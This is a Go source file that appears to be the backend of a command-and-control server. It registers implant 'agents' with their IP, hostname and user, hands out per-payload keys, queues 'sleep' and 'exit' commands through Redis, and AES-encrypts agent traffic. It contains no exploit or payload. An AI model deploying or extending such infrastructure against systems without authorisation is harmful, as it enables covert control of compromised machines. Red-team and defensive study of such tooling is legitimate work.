package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	"os"
	"strings"
	"time"

	"github.com/go-sql-driver/mysql"
	"github.com/joho/godotenv"
	"github.com/redis/go-redis/v9"
)

// Initialize connections upon starting web app
var DB *sql.DB
var Ctx = context.Background()
var R *redis.Client

func init() {
	var err error
	err = godotenv.Load("/app/.env")
	if err != nil {
		log.Println("Error loading .env file")
	}
	var db_user = os.Getenv("DB_USER")
	var db_pass = os.Getenv("DB_PASS")
	var database = os.Getenv("DATABASE")
	var docker_db = os.Getenv("DOCKER_DB")
	var redis_host = os.Getenv("REDIS_HOST")
	var redis_pass = os.Getenv("REDIS_PASS")
	var db_host string
	if strings.EqualFold(docker_db, "false") {
		db_host = os.Getenv("DB_HOST")
	} else {
		db_host = "mariadb"
	}

	// Create SQL ssl stuff
	caCert, err := os.ReadFile("certs/ca.crt")
	if err != nil {
		log.Println(err)
	}
	certPool := x509.NewCertPool()
	certPool.AppendCertsFromPEM(caCert)

	clientCert, err := tls.LoadX509KeyPair("certs/client.crt", "certs/client.key")
	if err != nil {
		log.Println(err)
	}

	tlsConfig := &tls.Config{
		RootCAs:      certPool,
		Certificates: []tls.Certificate{clientCert},
	}

	err = mysql.RegisterTLSConfig("custom", tlsConfig)
	if err != nil {
		log.Println(err)
	}

	// Create database connection
	dsn := fmt.Sprintf("%v:%v@tcp(%v:3306)/%v?parseTime=true&tls=custom", db_user, db_pass, db_host, database)

	DB, err = sql.Open("mysql", dsn)
	if err != nil {
		log.Println("Failed to connect to database:", err)
	}
	// configure connection pool
	DB.SetMaxOpenConns(20)
	DB.SetMaxIdleConns(10)
	DB.SetConnMaxLifetime(time.Minute * 30)

	// Ping to test connection
	if err := DB.Ping(); err != nil {
		log.Println("Database ping failed:", err)
		return
	}

	// Create redis connection
	Ctx = context.Background()
	R = redis.NewClient(&redis.Options{
		Addr:     redis_host + ":6379",
		DB:       0,
		Username: "default",
		Password: redis_pass,
	})

	if _, err := R.Ping(Ctx).Result(); err != nil {
		log.Println("Redis client failed to connect:", err)
		R = nil
	}
}

func get_data(rows *sql.Rows) [][]string {
	var results [][]string

	cols, err := rows.Columns() // get column names dynamically
	if err != nil {
		log.Println(err)
		return results
	}

	for rows.Next() {
		// Make a slice of interfaces to hold column values
		columns := make([]interface{}, len(cols))
		columnPointers := make([]interface{}, len(cols))
		for i := range columns {
			columnPointers[i] = &columns[i]
		}

		// Scan the row into columnPointers
		if err := rows.Scan(columnPointers...); err != nil {
			log.Println(err)
			continue
		}

		// Convert []interface{} to []string
		rowData := make([]string, len(cols))
		for i, col := range columns {
			if col != nil {
				rowData[i] = string(col.([]byte)) // DB returns []byte for string columns
			} else {
				rowData[i] = ""
			}
		}

		results = append(results, rowData)
	}
	// Returns a 2D array of rows and columns accessed by results[row][column]
	return results
}

func register_agent(uuid string, profile string, ip string, hostname string, user string, compile_id string) [][]string {
	if hostname == "" {
		hostname = ""
	}
	R.RPush(Ctx, uuid, "AGENT REGISTERED")
	R.Publish(Ctx, "new_agent", fmt.Sprintf("%v --> %v", user, ip))
	checkin := time.Now().UTC()
	_, err := DB.Exec(`INSERT INTO agents
						(uuid, name, status, first_seen, last_seen, sleep, profile, ip, hostname, user, compile_id) 
					VALUES 
						(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`, uuid, uuid, "ALIVE", checkin, checkin, 10, profile, ip, hostname, user, compile_id)
	if err != nil {
		log.Println(err)
	}
	rows, err := DB.Query("SELECT private, public FROM payloads WHERE compile_id = ?", compile_id)
	if err != nil {
		log.Println(err)
	}
	defer rows.Close()
	return get_data(rows)
}

func get_keys(uuid string) [][]string {
	rows, err := DB.Query("SELECT T2.private, T2.public FROM agents AS T1 JOIN payloads AS T2 ON T1.compile_id = T2.compile_id WHERE T1.uuid = ? AND T2.use_aes = 1;", uuid)
	if err != nil {
		log.Println(err)
	}
	defer rows.Close()
	return get_data(rows)
}

func update_seen(uuid string) {
	checkin := time.Now().UTC()
	_, err := DB.Exec("UPDATE agents SET last_seen = ? WHERE uuid = ?", checkin, uuid)
	if err != nil {
		log.Println(err)
	}
}

func small_check(uuid string) {
	cmd, err := R.LIndex(Ctx, uuid, -2).Result()
	if err != nil {
		log.Println(err)
	}
	raw_cmd := split(cmd, 1)
	switch raw_cmd[0] {
	case "exit":
		R.Del(Ctx, uuid)
		DB.Exec("DELETE FROM agents WHERE uuid = ?", uuid)
	case "sleep":
		DB.Exec("UPDATE agents SET sleep = ? WHERE uuid = ?", raw_cmd[1], uuid)
	}
}

func split(s string, num int) []string { // num is number of splits (1 = 1 split made)
	s = strings.TrimSpace(s)
	parts := strings.Fields(s)
	if len(parts) == 0 {
		return nil
	} else if len(parts) == 1 {
		return []string{parts[0]}
	} else {
		return []string{parts[0], strings.Join(parts[num:], " ")}
	}

}

func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - (len(data) % blockSize)
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padtext...)
}

func pkcs7Unpad(data []byte) ([]byte, error) {
	length := len(data)
	if length == 0 {
		return nil, errors.New("invalid padding size")
	}

	padding := int(data[length-1])
	if padding > length {
		return nil, errors.New("invalid padding")
	}

	for _, v := range data[length-padding:] {
		if int(v) != padding {
			return nil, errors.New("invalid padding")
		}
	}

	return data[:length-padding], nil
}

func aes_encrypt(plaintext []byte, keyHex, ivHex string) (string, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return "", err
	}

	iv, err := hex.DecodeString(ivHex)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	plaintext = pkcs7Pad(plaintext, block.BlockSize())

	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, plaintext)

	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func aes_decrypt(enc, keyHex, ivHex string) (string, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return "", err
	}

	iv, err := hex.DecodeString(ivHex)
	if err != nil {
		return "", err
	}

	ciphertext, err := base64.StdEncoding.DecodeString(enc)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	if len(ciphertext)%block.BlockSize() != 0 {
		return "", errors.New("ciphertext is not a multiple of block size")
	}

	plaintext := make([]byte, len(ciphertext))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(plaintext, ciphertext)

	unpadded, err := pkcs7Unpad(plaintext)
	if err != nil {
		return "", err
	}

	return string(unpadded), nil
}
